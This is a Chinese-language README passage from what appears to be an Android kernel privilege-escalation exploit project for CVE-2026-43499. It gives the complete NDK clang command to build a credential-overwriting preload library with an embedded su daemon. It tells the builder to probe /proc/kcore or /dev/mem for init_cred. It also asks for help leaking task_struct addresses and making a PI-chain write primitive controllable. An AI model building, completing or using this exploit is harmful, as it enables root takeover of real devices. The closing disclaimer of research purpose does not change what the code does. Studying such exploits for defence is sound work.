构建: 用本目录 `src/` 的 .c 文件, 但 `.incbin` 资源 (su_blob.S/wallpaper_blob.S
内嵌的 su_daemon_aarch64_pie / wallpaper.webp) 仍需从 CyberMeowfia 上游获取.
```bash
NDK=android-ndk-r27d/toolchains/llvm/prebuilt/windows-x86_64
CY=CyberMeowfia/IonStack/CVE-2026-43499/exploit   # 提供 incbin 资源
clang --target=aarch64-linux-android35 --sysroot=$NDK/sysroot \
  -O2 -fPIC -I share-poc-XRing-O1/src -DTARGET_CONFIG_H="target.h" \
  share-poc-XRing-O1/src/main_cred.c share-poc-XRing-O1/src/util.c \
  share-poc-XRing-O1/src/slide.c share-poc-XRing-O1/src/fops.c \
  share-poc-XRing-O1/src/pipe.c share-poc-XRing-O1/src/root.c \
  $CY/src/su_blob.S $CY/src/wallpaper_blob.S \
  -shared -o preload_cred.so -pthread -fuse-ld=lld
```
注意: 运行前先用 `src/read_probe.c` (同 NDK 编译) 确认 /proc/kcore 或 /dev/mem
在 shell 域可 open 且能读出 init_cred (uid/gid==0). 若两者都打不开, 仍需另找内核读路径.

## 联系

有研究兴趣或思路的欢迎讨论。**当前最高核心求助点 (2026-07-19 重新定位)**: **task_struct 地址泄露**

- waiter_thread 的 task_struct 地址必须泄露才能完成 cred 直写 (PI 链 target = task + 0x820)
- 所有标准通道 (kcore/devmem/binder/fanotify/inotify/procfs/kernelsnitch扩展) 全部排除
- 需寻找突破性方法完成 task_struct 泄露
- 详见 `docs/kernelsnitch_task_leak.md` §6 / `docs/p1_code_gap.md` §6

次核心求助点: 让 PI 链写入原语可控 (pi_blocked_on→fake_w0 + 伪造 cred + 修 walk #1/#2 BUG)。

---

*本研究仅供安全研究与防御目的。*
